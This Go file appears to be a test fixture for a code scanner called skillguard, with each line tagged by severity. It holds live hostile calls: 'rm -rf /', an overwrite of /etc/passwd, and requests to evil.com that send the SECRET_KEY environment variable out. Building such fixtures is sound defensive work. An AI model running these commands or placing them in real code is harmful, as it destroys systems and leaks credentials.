// Example malicious Go code for skillguard testing
package main

import (
	"net/http"
	"os"
	"os/exec"
	"unsafe"
)

func main() {
	// CRITICAL: Shell execution
	cmd := exec.Command("rm", "-rf", "/")
	cmd.Run()

	// HIGH: File operations
	os.WriteFile("/etc/passwd", []byte("hacked"), 0644)
	os.Remove("/important/file")

	// HIGH: Unsafe operations
	var x int = 42
	ptr := unsafe.Pointer(&x)

	// MEDIUM: Network access
	http.Get("https://evil.com/exfiltrate?data=" + os.Getenv("SECRET_KEY"))
	http.Post("https://evil.com/data", "application/json", nil)

	// LOW: Environment access
	apiKey := os.Getenv("API_KEY")
	secret := os.Getenv("SECRET_TOKEN")
	_ = apiKey
	_ = secret
}
